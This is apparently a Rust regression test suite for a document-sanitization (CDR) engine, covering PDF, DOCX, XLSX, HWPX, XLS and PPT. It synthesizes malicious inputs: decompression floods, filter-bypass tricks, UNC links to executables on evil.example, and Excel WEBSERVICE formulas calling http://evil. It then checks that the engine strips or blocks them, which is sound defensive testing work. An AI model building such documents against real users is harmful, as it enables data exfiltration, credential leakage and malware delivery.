//! 보안 검토에서 확인된 우회·자원 고갈 사례의 회귀 테스트.
//! 각 테스트는 실제로 재현된 공격 입력을 최소 형태로 합성한다.

mod common;

use std::collections::HashSet;
use std::io::{Cursor, Write};

use cdr::{CdrResult, Engine, Policy, Status};
use common::legacy::{self, biff, cfb, interactive, ppt_rec, read_cfb, stream, utf16};
use common::*;

fn cats(r: &CdrResult) -> HashSet<String> {
    r.findings.iter().map(|f| f.category.clone()).collect()
}

fn contains(hay: &[u8], needle: &[u8]) -> bool {
    hay.windows(needle.len()).any(|w| w == needle)
}

fn neutralizing() -> Engine {
    Engine::new(Policy {
        neutralize_embedded_ole: true,
        ..Policy::default()
    })
}

// ============================================================================ PDF

/// 객체 목록으로 최소 PDF 를 만든다 (1번 객체가 카탈로그)
fn raw_pdf(objs: &[Vec<u8>]) -> Vec<u8> {
    let mut out = b"%PDF-1.7\n".to_vec();
    let mut offsets = Vec::new();
    for (i, o) in objs.iter().enumerate() {
        offsets.push(out.len());
        out.extend(format!("{} 0 obj\n", i + 1).bytes());
        out.extend(o);
        out.extend(b"\nendobj\n");
    }
    let xref = out.len();
    out.extend(format!("xref\n0 {}\n0000000000 65535 f \n", objs.len() + 1).bytes());
    for o in offsets {
        out.extend(format!("{o:010} 00000 n \n").bytes());
    }
    out.extend(
        format!(
            "trailer\n<< /Size {} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n",
            objs.len() + 1
        )
        .bytes(),
    );
    out
}

fn pdf_stream(dict: &str, data: &[u8]) -> Vec<u8> {
    let mut v = format!("<< {dict} /Length {} >>\nstream\n", data.len()).into_bytes();
    v.extend(data);
    v.extend(b"\nendstream");
    v
}

fn page_with(resources: &str, content: &[u8], extra: Vec<Vec<u8>>) -> Vec<u8> {
    let mut objs = vec![
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        format!("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Resources {resources} /Contents 4 0 R >>")
            .into_bytes(),
        pdf_stream("", content),
    ];
    objs.extend(extra);
    raw_pdf(&objs)
}

/// 출력 PDF 의 모든 스트림을 풀어서 이어 붙인다
fn all_streams(pdf: &[u8]) -> Vec<u8> {
    let doc = lopdf::Document::load_mem(pdf).unwrap();
    let mut out = Vec::new();
    for o in doc.objects.values() {
        if let lopdf::Object::Stream(s) = o {
            out.extend(s.get_plain_content().unwrap_or_else(|_| s.content.clone()));
            out.push(b'\n');
        }
    }
    out
}

#[test]
fn pdf_operator_flood_is_blocked() {
    // 작은 압축 스트림이 수백만 개의 피연산자로 풀리는 입력
    let mut e = flate2::write::ZlibEncoder::new(Vec::new(), flate2::Compression::best());
    for _ in 0..(4_200_000 / 8) {
        e.write_all(b"0 0 0 0 0 0 0 0 ").unwrap();
    }
    let packed = e.finish().unwrap();
    let pdf = raw_pdf(&[
        b"<< /Type /Catalog /Pages 2 0 R >>".to_vec(),
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>".to_vec(),
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>".to_vec(),
        pdf_stream("/Filter /FlateDecode", &packed),
    ]);
    let r = Engine::default().process(&pdf, "flood.pdf");
    assert_eq!(r.status, Status::Blocked, "{}", r.reason);
    assert!(cats(&r).contains("resource"), "{:#?}", r.findings);
}

#[test]
fn pdf_form_with_indirect_subtype_is_filtered() {
    // /Subtype 이 간접 참조여도 폼 XObject 로 인식해 연산자를 걸러야 한다
    let pdf = page_with(
        "<< /XObject << /X1 5 0 R >> >>",
        b"q /X1 Do Q",
        vec![
            pdf_stream(
                "/Type /XObject /Subtype 6 0 R /BBox [0 0 100 100]",
                b"0 0 m 10 10 l S /Foo PS BX /Evil 1 2 3 xyzzy EX (VISIBLE) Tj",
            ),
            b"/Form".to_vec(),
        ],
    );
    let r = Engine::default().process(&pdf, "a.pdf");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    let s = all_streams(r.output.as_ref().unwrap());
    assert!(contains(&s, b"VISIBLE"));
    assert!(
        !contains(&s, b"xyzzy") && !contains(&s, b"PS\n"),
        "{}",
        String::from_utf8_lossy(&s)
    );
}

#[test]
fn pdf_jpx_image_is_excluded_even_with_indirect_keys() {
    let jp2 = b"\x00\x00\x00\x0cjP  \r\n\x87\nJPXPAYLOAD";
    let dict = "/Type /XObject /Width 1 /Height 1 /BitsPerComponent 8 /ColorSpace /DeviceGray";
    let pdf = page_with(
        "<< /XObject << /I1 5 0 R /I2 7 0 R >> >>",
        b"q 10 0 0 10 0 0 cm /I1 Do /I2 Do Q",
        vec![
            pdf_stream(&format!("{dict} /Subtype 6 0 R /Filter /JPXDecode"), jp2),
            b"/Image".to_vec(),
            pdf_stream(&format!("{dict} /Subtype /Image /Filter 8 0 R"), jp2),
            b"/JPXDecode".to_vec(),
        ],
    );
    let r = Engine::default().process(&pdf, "a.pdf");
    assert_eq!(
        r.findings
            .iter()
            .filter(|f| f.category == "risky-codec")
            .count(),
        2,
        "{:#?}",
        r.findings
    );
    let out = r.output.as_ref().unwrap();
    assert!(!contains(out, b"JPXPAYLOAD") && !contains(&all_streams(out), b"JPXPAYLOAD"));
}

#[test]
fn pdf_type3_glyph_cannot_bypass_filter_through_unknown_key() {
    // 같은 스트림을 알 수 없는 키(/AAA)로 먼저 참조해 필터 없이 복사되게 하는 우회
    let pdf = page_with(
        "<< /Font << /F1 5 0 R >> >>",
        b"BT /F1 12 Tf (a) Tj ET",
        vec![
            b"<< /Type /Font /Subtype /Type3 /AAA 6 0 R /FontBBox [0 0 10 10] /FontMatrix [1 0 0 1 0 0] /CharProcs << /a 6 0 R >> /Encoding << /Differences [97 /a] >> /FirstChar 97 /LastChar 97 /Widths [10] >>".to_vec(),
            pdf_stream("", b"0 0 d0 0 0 m 5 5 l S /Foo PS BX xyzzy EX"),
        ],
    );
    let r = Engine::default().process(&pdf, "a.pdf");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    let s = all_streams(r.output.as_ref().unwrap());
    assert!(!contains(&s, b"xyzzy"), "{}", String::from_utf8_lossy(&s));
    // 글리프의 d0 연산자는 보존되어야 한다 (해석기가 d + 0 으로 쪼개지 않도록)
    assert!(
        contains(&s, b"0 0 d0\n0 0 m"),
        "{}",
        String::from_utf8_lossy(&s)
    );
    let again = Engine::default().process(r.output.as_ref().unwrap(), "a.pdf");
    assert_eq!(again.status, Status::Clean, "{:#?}", again.findings);
}

// ============================================================================ OOXML

fn docx_with(document: &str, extra: &[(&str, String)], doc_rels: &str) -> Vec<u8> {
    let ct = format!(
        r#"<?xml version="1.0"?><Types xmlns="{CT}"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>"#
    );
    let rels = format!(
        r#"<Relationships xmlns="{PR}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="word/document.xml"/></Relationships>"#
    );
    let doc_rels = format!(r#"<Relationships xmlns="{PR}">{doc_rels}</Relationships>"#);
    let mut files: Vec<(&str, &[u8])> = vec![
        ("[Content_Types].xml", ct.as_bytes()),
        ("_rels/.rels", rels.as_bytes()),
        ("word/document.xml", document.as_bytes()),
        ("word/_rels/document.xml.rels", doc_rels.as_bytes()),
    ];
    for (n, d) in extra {
        files.push((n, d.as_bytes()));
    }
    make_zip(&files)
}

fn body(inner: &str) -> String {
    format!(
        r#"<w:document xmlns:w="{W}" xmlns:r="{R}" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office"><w:body>{inner}</w:body></w:document>"#
    )
}

#[test]
fn ooxml_node_budget_is_document_wide() {
    // 파트 하나하나는 한도 안이지만 합치면 넘는 경우
    let paras = "<w:p/>".repeat(1500);
    let header = format!(r#"<w:hdr xmlns:w="{W}">{paras}</w:hdr>"#);
    let data = docx_with(
        &body(&paras),
        &[("word/header1.xml", header)],
        &format!(r#"<Relationship Id="rId1" Type="{REL}/header" Target="header1.xml"/>"#),
    );
    let small = Engine::new(Policy {
        max_xml_nodes: 2500,
        ..Policy::default()
    });
    let r = small.process(&data, "a.docx");
    assert_eq!(r.status, Status::Blocked, "{:#?}", r.findings);
    assert!(cats(&r).contains("resource"), "{:#?}", r.findings);
    assert_eq!(
        Engine::default().process(&data, "a.docx").status,
        Status::Clean
    );
}

#[test]
fn zip_package_ratio_is_checked_across_entries() {
    // 항목 하나는 1MB 미만(항목별 압축률 검사 대상 아님)이지만 전체로는 비정상 압축률
    let blob = vec![b' '; 1024 * 1024 - 1];
    let names: Vec<String> = (0..20).map(|i| format!("word/pad{i}.xml")).collect();
    let mut files: Vec<(&str, &[u8])> = vec![("[Content_Types].xml", b"<Types/>")];
    for n in &names {
        files.push((n, &blob));
    }
    let r = Engine::default().process(&make_zip(&files), "a.docx");
    assert_eq!(r.status, Status::Blocked);
    assert!(cats(&r).contains("zip-bomb"), "{:#?}", r.findings);
}

#[test]
fn word_link_fields_to_unc_and_database_are_removed() {
    let field = |code: &str| {
        format!(
            r#"<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve">{code}</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>shown</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>"#
        )
    };
    let doc = body(&format!(
        r#"<w:p>{}{}{}{}</w:p><w:p><w:r><w:pict><v:shape o:href="/\evil\share\a.png"/></w:pict></w:r></w:p>"#,
        field(r#"HYPERLINK "\\\\evil.example\\share\\x.exe""#),
        field(r#"DATABASE \d "\\\\evil\\s\\db.mdb" \s "select 1""#),
        field(r#"RD "\\\\evil\\s\\a.docx""#),
        field(r#"HYPERLINK "https://example.com/""#),
    ));
    let r = Engine::default().process(&docx_with(&doc, &[], ""), "a.docx");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    let out = unzip(r.output.as_ref().unwrap());
    let xml = part(&out, "word/document.xml");
    assert!(!xml.contains("evil"), "{xml}");
    assert!(xml.contains("https://example.com/"), "{xml}");
    assert!(xml.contains("shown"));
}

fn xlsx_with(workbook_extra: &str, sheet: &str) -> Vec<u8> {
    let ct = format!(
        r#"<?xml version="1.0"?><Types xmlns="{CT}"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>"#
    );
    let rels = format!(
        r#"<Relationships xmlns="{PR}"><Relationship Id="rId1" Type="{REL}/officeDocument" Target="xl/workbook.xml"/></Relationships>"#
    );
    let wb = format!(
        r#"<workbook xmlns="{S}" xmlns:r="{R}"><sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets>{workbook_extra}</workbook>"#
    );
    let wb_rels = format!(
        r#"<Relationships xmlns="{PR}"><Relationship Id="rId1" Type="{REL}/worksheet" Target="worksheets/sheet1.xml"/></Relationships>"#
    );
    let sheet = format!(r#"<worksheet xmlns="{S}">{sheet}</worksheet>"#);
    make_zip(&[
        ("[Content_Types].xml", ct.as_bytes()),
        ("_rels/.rels", rels.as_bytes()),
        ("xl/workbook.xml", wb.as_bytes()),
        ("xl/_rels/workbook.xml.rels", wb_rels.as_bytes()),
        ("xl/worksheets/sheet1.xml", sheet.as_bytes()),
    ])
}

#[test]
fn excel_request_formulas_are_removed_everywhere() {
    let data = xlsx_with(
        r#"<definedNames><definedName name="x">WEBSERVICE("http://evil/?"&amp;S!A1)</definedName><definedName name="ok">S!$A$1</definedName></definedNames>"#,
        r#"<sheetData><row r="1"><c r="A1"><f>SUM(1,2)</f></c><c r="B1"><f>HYPERLINK("file://\\evil\s\x.exe","c")</f></c><c r="C1"><f>HYPERLINK("\\evil\s\y.exe","d")</f></c></row></sheetData><conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>WEBSERVICE("http://evil/cf")</formula></cfRule></conditionalFormatting><dataValidations count="1"><dataValidation type="list" sqref="A2"><formula1>FILTERXML(WEBSERVICE("http://evil/dv"),"//a")</formula1></dataValidation></dataValidations>"#,
    );
    let r = Engine::default().process(&data, "a.xlsx");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    let out = unzip(r.output.as_ref().unwrap());
    let all: String = ["xl/workbook.xml", "xl/worksheets/sheet1.xml"]
        .iter()
        .map(|n| part(&out, n))
        .collect();
    assert!(!all.contains("evil"), "{all}");
    assert!(
        !all.contains("cfRule") && !all.contains("dataValidation "),
        "{all}"
    );
    assert!(
        all.contains("SUM(1,2)") && all.contains(r#"name="ok""#),
        "{all}"
    );
}

// ============================================================================ HWPX

fn rezip_hwpx(src: &[u8], edit: impl Fn(&str, Vec<u8>) -> Vec<u8>) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
    for (name, data) in unzip(src) {
        let method = if name == "mimetype" {
            zip::CompressionMethod::Stored
        } else {
            zip::CompressionMethod::Deflated
        };
        let opts = zip::write::SimpleFileOptions::default().compression_method(method);
        w.start_file(&name, opts).unwrap();
        let data = edit(&name, data);
        w.write_all(&data).unwrap();
    }
    w.finish().unwrap().into_inner()
}

#[test]
fn hwpx_hyperlink_command_is_checked_with_path() {
    // Path 는 정상이지만 실제 실행되는 Command 가 위험한 경우
    let data = rezip_hwpx(&malicious_hwpx(), |name, data| {
        if name != "Contents/section0.xml" {
            return data;
        }
        String::from_utf8(data)
            .unwrap()
            .replace(
                "<hp:stringParam name=\"Path\">https://example.com/</hp:stringParam>",
                "<hp:stringParam name=\"Path\">https://example.com/</hp:stringParam><hp:stringParam name=\"Command\">\\\\\\\\evil.example\\\\s\\\\run.exe;1;0;0;</hp:stringParam>",
            )
            .into_bytes()
    });
    let r = Engine::default().process(&data, "a.hwpx");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    let out = unzip(r.output.as_ref().unwrap());
    let xml = part(&out, "Contents/section0.xml");
    assert!(!xml.contains("run.exe"), "{xml}");
    assert!(
        !xml.contains("https://example.com/"),
        "Path 도 함께 비워야 함: {xml}"
    );
}

// ============================================================================ XLS

/// HLINK 레코드: ref8 + CLSID + 하이퍼링크 개체(버전 2, 플래그, 표시 이름, 모니커)
fn hlink(display: &str, moniker: Vec<u8>) -> Vec<u8> {
    let mut body = vec![0u8; 8 + 16];
    body.extend(2u32.to_le_bytes());
    body.extend((0x01u32 | 0x02 | 0x10 | 0x14).to_le_bytes());
    let d = utf16(&format!("{display}\0"));
    body.extend(((d.len() / 2) as u32).to_le_bytes());
    body.extend(d);
    body.extend(moniker);
    biff(0x01B8, &body)
}

fn url_moniker(url: &str) -> Vec<u8> {
    let mut m = vec![
        0xE0, 0xC9, 0xEA, 0x79, 0xF9, 0xBA, 0xCE, 0x11, 0x8C, 0x82, 0x00, 0xAA, 0x00, 0x4B, 0xA9,
        0x0B,
    ];
    let u = utf16(&format!("{url}\0"));
    m.extend((u.len() as u32).to_le_bytes());
    m.extend(u);
    m
}

fn file_moniker(path: &str) -> Vec<u8> {
    let mut m = vec![0x03, 0x03, 0, 0, 0, 0, 0, 0, 0xC0, 0, 0, 0, 0, 0, 0, 0x46];
    m.extend(0u16.to_le_bytes());
    m.extend(((path.len() + 1) as u32).to_le_bytes());
    m.extend(path.bytes());
    m.push(0);
    m.extend(0xFFFFu16.to_le_bytes());
    m.extend(0xDEADu16.to_le_bytes());
    m.extend([0u8; 20]);
    let u = utf16(path);
    m.extend(((u.len() + 6) as u32).to_le_bytes());
    m.extend((u.len() as u32).to_le_bytes());
    m.extend(3u16.to_le_bytes());
    m.extend(u);
    m
}

fn name_record(name: &str) -> Vec<u8> {
    let mut body = vec![0u8; 15];
    body[3] = name.len() as u8;
    body.extend(name.bytes());
    biff(0x0018, &body)
}

#[test]
fn xls_dangerous_hyperlinks_are_blanked_in_place() {
    let src = legacy::xls(
        0,
        &[
            hlink(
                "report.example.com",
                url_moniker("file://evil.example/share/x.exe"),
            ),
            hlink("..\\tools\\x.exe", file_moniker("..\\tools\\run.exe")),
            hlink("sales@example.com", url_moniker("mailto:sales@example.com")),
            hlink(
                "Visit example.com for tips.",
                url_moniker("https://example.com/"),
            ),
        ],
    );
    let r = neutralizing().process(&src, "a.xls");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    let link = r
        .findings
        .iter()
        .find(|f| f.category == "dangerous-link")
        .expect("dangerous-link");
    // 표시 문자열은 대상으로 보고되지 않는다
    assert!(
        !link.description.contains("example.com,") && !link.description.contains("sales@"),
        "{}",
        link.description
    );
    let out = read_cfb(r.output.as_ref().unwrap());
    let wb = stream(&out, "Workbook").unwrap();
    assert_eq!(wb.len(), stream(&read_cfb(&src), "Workbook").unwrap().len());
    assert!(!contains(wb, &utf16("evil.example")));
    assert!(!contains(wb, b"run.exe") && !contains(wb, &utf16("run.exe")));
    for kept in [
        "https://example.com/",
        "mailto:sales@example.com",
        "Visit example.com for tips.",
        "report.example.com",
    ] {
        assert!(contains(wb, &utf16(kept)), "{kept}");
    }
}

#[test]
fn xls_request_functions_are_blocked() {
    for f in ["_xlfn.WEBSERVICE", "_xlfn.FILTERXML"] {
        let r = neutralizing().process(&legacy::xls(0, &[name_record(f)]), "a.xls");
        assert_eq!(r.status, Status::Blocked, "{f}");
        assert!(
            cats(&r).contains("external-resource"),
            "{f}: {:#?}",
            r.findings
        );
    }
}

// ============================================================================ PPT

fn ppt_doc(inner: Vec<u8>) -> Vec<u8> {
    ppt_doc_with(inner, Vec::new())
}

/// DocumentContainer 와 그 뒤의 최상위 레코드들
fn ppt_doc_with(inner: Vec<u8>, top: Vec<u8>) -> Vec<u8> {
    let mut doc = ppt_rec(0xF, 0, 0x03E8, &inner);
    doc.extend(top);
    cfb(&[("PowerPoint Document", &doc), ("Current User", &[0u8; 28])])
}

#[test]
fn ppt_relative_path_hyperlink_is_neutralized() {
    let mut link = ppt_rec(0, 0, 0x0FD3, &7u32.to_le_bytes());
    link.extend(ppt_rec(0, 1, 0x0FBA, &utf16("..\\..\\tools\\run.exe")));
    let mut inner = ppt_rec(0xF, 0, 0x0FD7, &link);
    inner.extend(interactive(4, 7));
    let r = Engine::default().process(&ppt_doc(inner), "a.ppt");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    assert!(cats(&r).contains("dangerous-link"), "{:#?}", r.findings);
    let doc = stream(&read_cfb(r.output.as_ref().unwrap()), "PowerPoint Document")
        .unwrap()
        .to_vec();
    assert!(!contains(&doc, &utf16("run.exe")));
}

#[test]
fn ppt_ole_storage_without_zlib_header_is_still_replaced() {
    // 압축 헤더가 없는(비압축) 임베디드 개체도 개체로 인식해야 한다
    let mut body = 8192u32.to_le_bytes().to_vec();
    body.extend(b"MZ\x90\x00 raw uncompressed payload");
    body.resize(8192, b'Z');
    let src = ppt_doc_with(Vec::new(), ppt_rec(0, 1, 0x1011, &body));
    assert_eq!(
        Engine::default().process(&src, "a.ppt").status,
        Status::Blocked
    );
    let r = neutralizing().process(&src, "a.ppt");
    assert_eq!(r.status, Status::Sanitized, "{}", r.reason);
    let doc = stream(&read_cfb(r.output.as_ref().unwrap()), "PowerPoint Document")
        .unwrap()
        .to_vec();
    assert!(!contains(&doc, b"payload"));
}
